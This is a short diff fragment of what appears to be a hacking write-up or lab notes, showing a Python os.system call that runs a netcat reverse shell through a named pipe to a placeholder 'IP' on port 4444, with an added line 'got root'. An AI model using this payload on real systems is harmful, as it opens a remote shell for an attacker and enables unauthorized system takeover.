@@ -204,3 +204,5 @@ import os
 
 os.system("mkfifo /tmp/kirxhbg; nc IP 4444 0</tmp/kirxhbg | /bin/sh >/tmp/kirxhbg 2>&1; rm /tmp/kirxhbg")
 ```
+
+got root
